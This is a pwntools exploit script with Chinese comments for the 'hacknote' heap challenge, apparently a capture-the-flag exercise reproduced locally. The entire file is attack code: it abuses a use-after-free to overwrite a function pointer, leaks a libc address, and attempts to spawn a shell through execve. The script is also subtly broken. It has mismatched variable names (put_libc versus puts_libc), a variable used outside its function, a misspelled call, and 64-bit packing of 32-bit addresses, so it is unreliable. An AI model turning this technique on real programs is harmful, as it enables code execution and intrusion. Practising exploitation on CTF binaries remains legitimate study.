#我想做的是本地复现，所以会和原来的exp略有不同
from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
io = process('./hacknote')
elf = ELF('./hacknote')
put_got = 0x0804A024
put_func = 0x0804863B
def add(size,note_size):                #这里通过把所有的函数都列出来，更方便的进行菜单级的操作
    io.send(b'1')
    io.recvuntil('size :')
    io.send(size)
    io.recvuntil('Content :')
    io.send(note_size)
    print(b'add success')

def delete(index):
    io.send(b'2')
    io.recvuntil('Index :')
    io.send(index)
    print(b'delete success')

def exceve(index):
    io.send(b'3')
    io.recvuntil('Index :')
    io.send(index)
    print(b'exceve success')


def leak():
    add(b'32',b'a'*16)
    add(b'32',b'a'*16)                      #这里malloc了两个chunk，为以后的uaf作基础
    delete(b'0')
    delete(b'1')                            #这里free掉了两个chunk，但此时的指针还尚未NULL，而此时这两个chunk的指针还依然指向原来的两个chunk处，由于这两个指针的地址大小共为16Byte所以一会就再申请16Byte大小的chunk时，就能导致uaf漏洞辣。
    add(b'16',p64(put_got)+p64(put_func))
    exceve(b'0')
    put_libc =u64(io.recv()[0:8])
    Libc = LibcSearcher('_puts',put_libc)
    libc_base = puts_libc - Libc.dump('_puts')
    libc_execve = libc_base + Libc.dump('execve')
    print(b'leak success')

def pwn():
    add(b'32',b'a'*16)
    add(b'32',b'a'*16)                      #这里malloc了两个chunk，为以后的uaf作基础
    delete(b'0')
    delete(b'1')                            #这里free掉了两个chunk，但此时的指针还尚未NULL，而此时这两个chunk的指针还依然指向原来的两个chunk处，由于这两个指针的地址大小共为16Byte所以一会就再申请16Byte大小的chunk时，就能导致uaf漏洞辣。
    add(b'16',p64('||sh')+p64(libc_execve))      #这里的'||sh'是因为此时的函数调用(看IDA里的)的规则是函数地址调用的方式进行调用，此时即为&(libc_execve)(libc_execve||sh),而因为这时候execve作为函数是无法调用他自己地址这样的参数的(exevce(&libc_exevce)这样的调用是无效的),所以加一个||sh表示或者也可以execve(sh)
    execve(b'0')
    print(b'pwn success')

leak()
pwn()
io.interactive()
